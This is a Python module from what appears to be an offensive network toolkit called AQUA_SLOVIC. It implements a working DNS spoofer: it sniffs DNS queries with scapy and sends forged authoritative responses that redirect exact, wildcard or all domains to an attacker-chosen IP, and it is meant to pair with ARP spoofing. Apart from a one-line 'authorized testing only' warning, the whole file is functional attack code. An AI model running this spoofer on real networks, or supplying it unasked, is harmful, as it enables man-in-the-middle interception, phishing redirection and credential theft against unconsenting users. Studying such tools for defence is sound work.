"""
AQUA_SLOVIC — DNS Spoofer Module
Intercept DNS queries and inject forged responses.
"""

import threading
import fnmatch

from colorama import Fore, Style

from aquaslovic.core.utils import (
    print_info, print_success, print_error, print_warning,
    print_table, is_root, require_root,
)


class DNSSpoofer:
    """
    DNS query spoofing via intercepting and forging DNS responses.

    Supports:
        - Individual domain spoofing
        - Wildcard domain rules (e.g., *.example.com)
        - Redirect ALL DNS queries to a single IP
        - Best used with ARP spoofing active

    WARNING: For authorized security testing only!
    """

    def __init__(self):
        self.running = False
        self.spoof_thread = None
        self.records = {}    # domain → IP mapping
        self.spoof_all = ""  # If set, redirect ALL queries to this IP

    def add_record(self, domain, ip):
        """
        Add a DNS spoofing rule.

        Args:
            domain: Domain to spoof (supports wildcards like *.example.com)
            ip: IP address to redirect to
        """
        self.records[domain.lower()] = ip
        print_success(
            f"DNS rule added: {Fore.WHITE}{domain}{Style.RESET_ALL} -> "
            f"{Fore.RED}{ip}{Style.RESET_ALL}"
        )

    def remove_record(self, domain):
        """Remove a DNS spoofing rule."""
        domain = domain.lower()
        if domain in self.records:
            del self.records[domain]
            print_success(f"DNS rule removed: {domain}")
        else:
            print_warning(f"No rule found for: {domain}")

    def list_records(self):
        """Display all current DNS spoofing rules."""
        if not self.records and not self.spoof_all:
            print_warning("No DNS spoofing rules configured.")
            print_info("Add rules: dns.spoof add <domain> <ip>")
            return

        if self.spoof_all:
            print_info(
                f"ALL DNS queries -> {Fore.RED}{self.spoof_all}{Style.RESET_ALL}"
            )

        if self.records:
            headers = ["Domain", "Redirect To"]
            rows = [[domain, ip] for domain, ip in sorted(self.records.items())]
            print_table(headers, rows)

    def start(self):
        """Start the DNS spoofer."""
        if not require_root():
            return

        if self.running:
            print_warning("DNS spoofer is already running.")
            return

        if not self.records and not self.spoof_all:
            print_error("No DNS rules configured.")
            print_info("Add rules first: dns.spoof add <domain> <ip>")
            print_info("Or redirect all: dns.spoof all <ip>")
            return

        try:
            from scapy.all import DNS
        except ImportError:
            print_error("Scapy is required for DNS spoofing. Install: pip install scapy")
            return

        self.running = True

        print_success("DNS spoofer started.")
        if self.spoof_all:
            print_info(f"All DNS queries -> {Fore.RED}{self.spoof_all}{Style.RESET_ALL}")
        else:
            print_info(f"Spoofing {len(self.records)} domain(s).")
        print_info("Use 'dns.spoof off' to stop.")

        self.spoof_thread = threading.Thread(
            target=self._spoof_loop, daemon=True
        )
        self.spoof_thread.start()

    def stop(self):
        """Stop the DNS spoofer."""
        if not self.running:
            print_warning("DNS spoofer is not running.")
            return

        self.running = False
        print_info("DNS spoofer stopped.")

    def _spoof_loop(self):
        """Intercept and spoof DNS queries using scapy."""
        try:
            from scapy.all import (
                sniff, IP, UDP, DNS, DNSQR, DNSRR,
                send, conf,
            )

            def process_packet(packet):
                if not self.running:
                    return

                if not (packet.haslayer(DNS) and
                        packet.haslayer(DNSQR) and
                        packet[DNS].qr == 0):  # Only queries (qr=0)
                    return

                qname = packet[DNSQR].qname.decode(errors="ignore").rstrip(".")
                redirect_ip = self._match_domain(qname)

                if redirect_ip:
                    print(
                        f"  {Fore.RED}[DNS SPOOF]{Style.RESET_ALL} "
                        f"{qname} -> {Fore.RED}{redirect_ip}{Style.RESET_ALL} "
                        f"(from {packet[IP].src})"
                    )

                    # Forge DNS response
                    spoofed = (
                        IP(dst=packet[IP].src, src=packet[IP].dst) /
                        UDP(dport=packet[UDP].sport, sport=53) /
                        DNS(
                            id=packet[DNS].id,
                            qr=1,  # Response
                            aa=1,  # Authoritative
                            qd=packet[DNS].qd,
                            an=DNSRR(
                                rrname=packet[DNSQR].qname,
                                ttl=300,
                                rdata=redirect_ip,
                            ),
                        )
                    )
                    send(spoofed, verbose=False)

            sniff(
                filter="udp port 53",
                prn=process_packet,
                store=False,
                stop_filter=lambda p: not self.running,
            )

        except Exception as e:
            if self.running:
                print_error(f"DNS spoofer error: {e}")
                self.running = False

    def _match_domain(self, qname):
        """
        Check if a queried domain matches any spoofing rule.
        Returns the redirect IP or None.
        """
        qname = qname.lower()

        # Check spoof_all first
        if self.spoof_all:
            return self.spoof_all

        # Exact match
        if qname in self.records:
            return self.records[qname]

        # Wildcard match
        for domain, ip in self.records.items():
            if domain.startswith("*."):
                pattern = domain[2:]  # Remove *. prefix
                if qname == pattern or qname.endswith("." + pattern):
                    return ip
            elif fnmatch.fnmatch(qname, domain):
                return ip

        return None
